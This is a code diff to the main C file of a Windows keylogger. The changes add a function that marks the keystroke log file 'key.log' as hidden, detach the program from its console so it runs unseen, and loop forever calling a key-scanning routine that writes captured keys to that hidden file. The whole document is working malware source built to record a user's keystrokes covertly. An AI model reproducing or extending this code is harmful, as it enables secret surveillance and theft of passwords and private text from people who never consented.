@@ -1,18 +1,30 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdbool.h>
+#include <libgen.h>
 
 #include "keyscan.h"
-#include "setup.h"
 
+#define LEN_VALUE_NAME 1024
 #define KEY_FILE "key.log"
 
+bool hide(const char *path){
+    DWORD attr = 0;
+    attr = GetFileAttributesA(path);
+    if(attr & FILE_ATTRIBUTE_HIDDEN)
+        return true;
+    attr |= FILE_ATTRIBUTE_HIDDEN;
+    return SetFileAttributes(path, attr);
+}
+
 int main(int argc, char **argv){
-    char path[LEN_VALUE_NAME] = {'\0'};
+    char cur_path[LEN_VALUE_NAME] = {'\0'};
     FreeConsole();
-    setup(path);
-    sprintf_s(path, LEN_VALUE_NAME, "%s\\%s", dirname(path), KEY_FILE);
+    GetModuleFileName(NULL, cur_path, sizeof(cur_path));
+    sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
+    hide(cur_path);
     while(true){
-        scanCode(path);
+        scanCode(cur_path);
     }
     return 0;
 }
